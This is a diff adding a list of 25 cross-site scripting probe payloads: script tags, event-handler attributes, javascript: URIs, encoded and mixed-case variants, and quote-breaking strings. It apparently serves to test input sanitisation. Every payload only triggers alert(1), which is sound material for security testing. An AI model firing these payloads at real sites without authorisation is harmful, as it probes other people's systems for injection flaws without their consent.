@@ -1,0 +1,25 @@
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+javascript:alert(1)
+<iframe src=javascript:alert(1)>
+<details open ontoggle=alert(1)>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<video><source onerror=alert(1)>
+<object data=javascript:alert(1)>
+%3Cscript%3Ealert(1)%3C/script%3E
+&lt;script&gt;alert(1)&lt;/script&gt;
+<ScRiPt>alert(1)</ScRiPt>
+<img src="x" onerror="alert(1)">
+<svg><animate onbegin=alert(1)>
+<table background=javascript:alert(1)>
+<a href=javascript:alert(1)>click</a>
+';alert(1);//
+";alert(1);//
+<embed src=javascript:alert(1)>
+<isindex type=image src=1 onerror=alert(1)>
